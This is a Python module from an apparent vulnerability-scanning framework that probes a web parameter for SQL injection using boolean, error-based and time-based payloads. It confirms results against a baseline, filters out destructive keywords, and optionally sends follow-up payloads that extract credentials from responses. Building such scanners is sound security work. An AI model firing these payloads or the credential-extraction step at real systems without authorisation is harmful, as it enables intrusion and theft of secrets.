"""L2 SQL injection — minimal read proofs on audited parameters only.

Write/delete payloads are never present in the template library.
"""

from __future__ import annotations

from typing import TYPE_CHECKING, Any

from .common import EngineResult, make_finding

if TYPE_CHECKING:
    from ..base import Prober
    from ..capability.spec import ProbeSpec
    from ..capability.types import ProbeContext

# Audited read-only proof payloads only.
_BOOLEAN_PAYLOADS = ("' OR '1'='1", "1 OR 1=1")
_ERROR_PAYLOADS = ("'", '"')
# Time-based is last-resort; keep count to 1 and short.
_TIME_PAYLOADS = ("'; WAITFOR DELAY '0:0:2'--",)


async def run_sqli(
    prober: Prober,
    ctx: ProbeContext,
    spec: ProbeSpec,
) -> EngineResult:
    entry = spec.entry
    origin = prober._url(ctx.hit)
    result = EngineResult()
    before = prober.budget_consumed

    path = entry.get("path") or ""
    param = entry.get("param") or "id"
    method = (entry.get("method") or "GET").upper()
    baseline = entry.get("baseline", "1")
    # Only allow payloads listed in the Spec (reviewed); fall back to boolean/error.
    payloads = list(entry.get("payloads") or ())
    if not payloads:
        payloads = list(_BOOLEAN_PAYLOADS[:1]) + list(_ERROR_PAYLOADS[:1])
    # Hard ban destructive keywords even if a bad Spec sneaks in.
    banned = ("drop ", "delete ", "truncate ", "update ", "insert ", "alter ")
    payloads = [p for p in payloads if not any(b in p.lower() for b in banned)][:4]

    secret_payloads = list(entry.get("secret_payloads") or ())
    secret_payloads = [p for p in secret_payloads if not any(b in p.lower() for b in banned)][:2]

    if not path:
        result.reason = "no sqli path"
        return result

    headers: dict[str, str] = {}
    if entry.get("use_auth") and ctx.auth_headers:
        headers = dict(ctx.auth_headers)

    async def _request(value: str) -> Any:
        url = prober._url(ctx.hit, path)
        if method == "POST":
            body = dict(entry.get("body") or {})
            body[param] = value
            return await prober._post(url, json=body, headers=headers or None)
        return await prober._get(url, params={param: value}, headers=headers or None)

    baseline_resp = await _request(str(baseline))
    result.requests_used = prober.budget_consumed - before
    baseline_len = len(baseline_resp.text) if baseline_resp is not None else 0
    baseline_status = baseline_resp.status_code if baseline_resp is not None else 0

    confirmed = False
    for payload in payloads:
        if result.requests_used >= spec.max_requests:
            break
        resp = await _request(payload)
        result.requests_used = prober.budget_consumed - before
        if resp is None:
            continue
        text = resp.text or ""
        # Error-based: SQL error keywords
        if any(
            kw in text.lower()
            for kw in ("sql syntax", "sqlite", "postgresql", "mysql", "odbc", "syntax error")
        ):
            confirmed = True
        # Boolean-ish: large status/body delta vs baseline
        if baseline_resp is not None and (
            resp.status_code != baseline_status or abs(len(text) - baseline_len) > 50
        ):
            confirmed = True
        found = prober._extract_from_response(resp, ctx.hit, f"{spec.product}_sqli")
        result.credentials.extend(found)
        if found:
            confirmed = True
            break

    # Optional secret-read follow-up (UNION / error extract) — still read-only.
    if confirmed and secret_payloads:
        for payload in secret_payloads:
            if result.requests_used >= spec.max_requests:
                break
            resp = await _request(payload)
            result.requests_used = prober.budget_consumed - before
            found = prober._extract_from_response(resp, ctx.hit, f"{spec.product}_sqli_secret")
            result.credentials.extend(found)

    if confirmed:
        result.findings.append(
            make_finding(
                vuln_class=spec.vuln_class,
                product=spec.product,
                target_origin=origin,
                spec_id=spec.id,
                cve_ids=spec.cve_ids,
                confirmed=True,
                summary=f"SQL injection read-proof on {path}?{param}",
                severity="high",
                credentials=result.credentials,
                evidence={"path": path, "param": param},
            )
        )
    else:
        result.reason = "sqli not confirmed"
    return result
